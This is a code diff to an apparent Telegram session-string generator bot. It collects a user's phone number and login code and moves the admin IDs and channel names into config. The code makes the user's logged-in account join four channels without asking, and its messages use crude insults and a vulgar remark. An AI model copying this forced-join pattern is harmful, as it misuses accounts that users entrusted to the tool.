@@ -28,7 +28,7 @@ from telethon.errors import (
     SessionPasswordNeededError,
     PasswordHashInvalidError
 )
-from config import API_ID, API_HASH
+from config import *
 from data import Data
 
 
@@ -43,12 +43,7 @@ buttons_ques = [
 
 admin_kynan = [
     [
-      InlineKeyboardButton(text="👮‍♂ Kazu", user_id=5063062493),
-      InlineKeyboardButton(text="👮‍♂ Kynan", user_id=1054295664),
-    ],
-    [
-      InlineKeyboardButton(text="👮‍♂ Jhor", user_id=1755047203),
-      InlineKeyboardButton(text="👮‍♂ Omnya", user_id=1810243126),
+      InlineKeyboardButton(text="👮‍♂ Owner", user_id=OWNER_ID),
     ],
   ]
 
@@ -67,19 +62,6 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     user_id = msg.chat.id
     api_id = API_ID
     api_hash = API_HASH
-    """
-    if await cancelled(api_id):
-        return
-    try:
-        api_id = int(api_id_msg.text)
-    except ValueError:
-        await api_id_msg.reply('Not a valid API_ID (which must be an integer). Please start generating session again.', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
-        return
-    api_hash_msg = await bot.ask(user_id, 'Please send your `API_HASH`', filters=filters.text)
-    if await cancelled(salah):
-        return
-    api_hash = api_hash_msg.text
-    """
     await asyncio.sleep(1.0)
     if not is_bot:
         t = "**Woy Bangsat Kirim Nomer Akun Telegram Lu.** \n**Contoh** : `+6214045` **Jing Jadi Laper Gua**"
@@ -109,9 +91,6 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
                 code = await client.send_code_request(phone_number)
             else:
                 code = await client.send_code(phone_number)
-    #except (ApiIdInvalid, ApiIdInvalidError):
-        #await msg.reply('`API_ID` and `API_HASH` combination is invalid. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
-        #return
     except (PhoneNumberInvalid, PhoneNumberInvalidError):
         await msg.reply('**Nomer Akun Telegram Lu Ga Terdaftar Jink.**\n**Yang Bener Dikit Blog, Dari Ulang.**', reply_markup=InlineKeyboardMarkup(Data.generate_button))
         return
@@ -168,17 +147,17 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     try:
         try:
             if telethon:
-                await client(JoinChannelRequest("kazusupportgrp"))
-                await client(JoinChannelRequest("veaperas1k"))
-                await client(JoinChannelRequest("Html12text"))
-                await client(JoinChannelRequest("mutuovertime"))
+                await client(JoinChannelRequest(f"{JOIN1}"))
+                await client(JoinChannelRequest(f"{JOIN2}"))
+                await client(JoinChannelRequest(f"{JOIN3}"))
+                await client(JoinChannelRequest(f"{JOIN4}"))
             else:
-                await client.join_chat("kazusupportgrp")
-                await client.join_chat("veaperas1k")
-                await client.join_chat("Html12text")
-                await client.join_chat("mutuovertime")
+                await client.join_chat(f"{JOIN1}")
+                await client.join_chat(f"{JOIN2}")
+                await client.join_chat(f"{JOIN3}")
+                await client.join_chat(f"{JOIN4}")
         except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
-            await msg.reply('**Jiah akun lu dibanned di Kazu Support.\nCoba sono ngadu ke salah 1 admin Kazu Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
+            await msg.reply(f"**Jiah akun lu dibanned.\nCoba sono ngadu ke salah 1 admin biar dibuka ban nya.**", quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
             return
         if not is_bot:
             await client.send_message("me", text)
@@ -188,7 +167,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
         pass
     await client.disconnect()
     await asyncio.sleep(1.0)
-    await bot.send_message(msg.chat.id, " {} **Dah Jadi Ya Bangsat.** \n\n**Cek Pesan Tersimpan Lu Yang Banyak Bokep Nya!** \n\n**Minimal Bilang Makasih Ke** @disinikazu **Atau Ke** @kazusupportgrp **Karna Akun Lu Kaga Deak**".format("Telethon" if telethon else "Pyrogram"))
+    await bot.send_message(msg.chat.id, " {} **Dah Jadi Ya Bangsat.** \n\n**Cek Pesan Tersimpan Lu Yang Banyak Bokep Nya!**".format("Telethon" if telethon else "Pyrogram"))
 
 
 async def cancelled(msg):
